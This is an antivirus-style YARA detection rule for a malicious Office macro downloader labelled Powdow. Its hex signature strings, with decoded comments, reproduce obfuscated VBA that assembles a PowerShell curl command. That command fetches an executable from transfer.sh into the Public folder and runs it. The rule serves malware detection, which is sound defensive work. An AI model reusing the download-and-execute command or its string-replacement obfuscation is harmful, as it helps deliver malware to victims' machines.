
rule TrojanDownloader_O97M_Powdow_STQ_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.STQ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {72 69 63 6b 74 68 65 64 69 20 3d 20 22 64 38 73 61 73 61 44 37 30 41 2d 34 33 64 38 73 61 73 61 42 2d 64 38 73 61 73 61 41 34 32 2d 39 64 38 73 61 73 61 34 22 } //1 rickthedi = "d8sasaD70A-43d8sasaB-d8sasaA42-9d8sasa4"
		$a_01_1 = {73 79 39 63 71 75 75 77 20 3d 20 75 73 61 20 26 20 22 73 65 72 73 5c 50 75 62 22 } //1 sy9cquuw = usa & "sers\Pub"
		$a_01_2 = {6a 6b 74 6c 20 3d 20 73 79 39 63 71 75 75 77 20 26 20 22 6c 69 63 5c 66 64 6a 6b 34 38 33 75 39 72 65 79 38 39 74 35 33 65 2e 65 78 65 22 } //1 jktl = sy9cquuw & "lic\fdjk483u9rey89t53e.exe"
		$a_01_3 = {67 6f 64 6b 6e 6f 77 73 20 3d 20 52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e 73 79 39 63 71 75 75 77 72 73 5e 68 73 79 39 63 71 75 75 77 6c 6c 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 73 3a 2f 2f 74 72 61 6e 73 66 73 79 39 63 71 75 75 77 72 2e 73 68 2f 67 73 79 39 63 71 75 75 77 74 2f 4a 51 4a 55 33 63 2f 66 64 72 73 73 79 39 63 71 75 75 77 74 72 67 68 2e 73 79 39 63 71 75 75 77 5e 78 73 79 39 63 71 75 75 77 20 2d 6f 20 22 20 26 20 6a 6b 74 6c 20 26 20 22 3b 22 20 26 20 6a 6b 74 6c 2c 20 22 73 79 39 63 71 75 75 77 22 2c 20 22 65 22 29 } //1 godknows = Replace("cmd /c pow^sy9cquuwrs^hsy9cquuwll/W 01 c^u^rl htt^ps://transfsy9cquuwr.sh/gsy9cquuwt/JQJU3c/fdrssy9cquuwtrgh.sy9cquuw^xsy9cquuw -o " & jktl & ";" & jktl, "sy9cquuw", "e")
		$a_01_4 = {64 6f 61 67 79 69 2e 65 78 65 63 20 67 6f 64 6b 6e 6f 77 73 } //1 doagyi.exec godknows
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}